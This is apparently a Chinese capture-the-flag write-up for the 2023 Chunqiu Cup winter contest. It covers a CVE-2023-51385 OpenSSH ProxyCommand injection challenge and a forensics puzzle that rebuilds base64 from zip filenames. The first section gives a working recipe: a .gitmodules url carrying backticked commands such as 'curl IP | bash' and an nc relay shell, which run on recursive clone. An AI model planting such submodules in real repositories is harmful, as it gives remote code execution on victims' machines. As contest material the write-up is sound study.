---
title: 【WP】2023年春秋杯冬季赛 misc、reverse、crypto 类题目解析
contest: 春秋杯
year: 2023
difficulty: medium
vuln_type: misc_unknown
tags: [CVE-2023-51385, OpenSSH-ProxyCommand, git-submodule, .gitmodules-url-injection, base64-filename-stitch, foremost-file-carve, who-stole-my-takeout]
attack_chain: 1. modules CVE-2023-51385 OpenSSH ProxyCommand 注入 + .gitmodules url 包含 ssh://`命令`foo.ichunqiu.com/bar/2. who-stole-my-takeout 外卖箱.zip foremost 分离 + 文件名用户X_XXXX= 的外卖 base64 拼 + - 替换为 / / 3. 排序按用户编号拼接 base64
key_payload: .gitmodules url = ssh://`curl IP|bash`foo.ichunqiu.com/bar  filename regex = 用户(\d+)_([\w+-=]{4})的外卖
one_liner: 2023 春秋杯冬季赛 Misc/Reverse/Crypto WP，CVE-2023-51385 OpenSSH ProxyCommand 注入 + 外卖文件名 base64 拼图。
lesson: CVE-2023-51385 OpenSSH ProxyCommand %h 未过滤反引号执行命令；.gitmodules url 字段是 git clone 触发 RCE 入口；中文压缩包文件名 cp437→gbk 解码是中文文件名处理技巧。
quality: high
---

# 【WP】2023年春秋杯冬季赛 misc、reverse、crypto 类题目解析

## 概览
2023 春秋杯冬季赛 3 道题 WP：modules (CVE-2023-51385)、谁偷吃了我的外卖、其他。

## modules (CVE-2023-51385 OpenSSH ProxyCommand 注入)

### 漏洞
- 复现 2023 年 12 月中旬 OpenSSH ProxyCommand 配置项未正确过滤引起的命令注入漏洞
- OpenSSH 配置项 ProxyCommand 允许执行 shell 命令
- `%h` 参数引用主机名
- 恶意主机名含反引号 ` 或 $()` 即可在 shell 中执行命令

### 触发条件
```ssh-config
host *.ichunqiu.com
  ProxyCommand /usr/bin/nc -X connect -x 192.0.2.0:8080 %h %p
```
- 主机名含反引号 + ichunqiu.com 域名后缀即可触发

### 利用：git 子模块克隆
```bash
git clone --recurse-submodules <repo>
```

### 编写 .gitmodules
```
[submodule "cve"]
	path = cve
	url = ssh://`命令语句`foo.ichunqiu.com/bar
```

### 命令语句
- `curl IP | bash`
- `nc IP PORT1 |bash|nc IP PORT2`
- `bash exp.sh`
- `cat /flag > /var/www/html/flag`
- 命令中出现 `/` 会解析错误，先写入 exp.sh

### 构造 git 项目
1. 修改别人的项目：
   ```bash
   git clone https://github.com/vin01/poc-proxycommand-vulnerable
   cd poc-proxycommand-vulnerable && vi .gitmodules
   git add . && git commit -m "gamelab"
   ```
2. 从头弄一个项目：
   ```bash
   mkdir gamelab && cd gamelab
   git init .
   git submodule add https://github.com/chunqiugame/test cve
   vi .gitmodules
   git add . && git commit -m "gamelab"
   ```
- 推送到 git 仓库，部署时执行命令

## 谁偷吃了我的外卖 (Misc 取证)

### 解题
- 010 Editor 看到图片里有压缩包
- binwalk 检测 foremost 分离得 `外卖箱.zip`
- 压缩包提示 `-` 等于 `/`

### 关键发现
- 用户1的文件名不全，文件尾部有 `=`
- 提示 `-` 等于 `/`
- 所有文件名 `_` 后面部分拼接 = base64
- base64 4 字符一组，文件名也是 4 字符一组

### exp.py
```python
import base64
import re
import zipfile

zip_file_path = '外卖箱.zip'
with zipfile.ZipFile(zip_file_path, 'r') as zip_ref:
    file_list = zip_ref.namelist()
    file_list_decoded = [file.encode('cp437').decode('gbk') for file in file_list]

base64_data_list = []
for i in file_list_decoded:
    try:
        base64_data = re.search(r"用户(\d+)_([\w+-=]{4})的外卖", i).groups()
        base64_data_list.append(base64_data)
    except:
        pass

# 按用户编号排序
base64_data_list_sorted = sorted(base64_data_list, key=lambda i: int(i[0]))
# 拼接 + 替换 - 为 /
```

## 经验提炼
- CVE-2023-51385 OpenSSH ProxyCommand %h 未过滤反引号执行命令
- .gitmodules url 字段是 git clone 触发 RCE 入口
- 中文压缩包文件名 `cp437→gbk` 解码是中文文件名处理技巧
- `--recurse-submodules` 是克隆子模块的关键选项
- base64 4 字符一组拼接是常见拼图还原手法
- `-` 替换为 `/` 是 base64 字符串到文件路径的转换
- `foremost` 比 binwalk 更稳定分离文件
- `ssh://` 协议触发 ProxyCommand 比 `git://` 更隐蔽
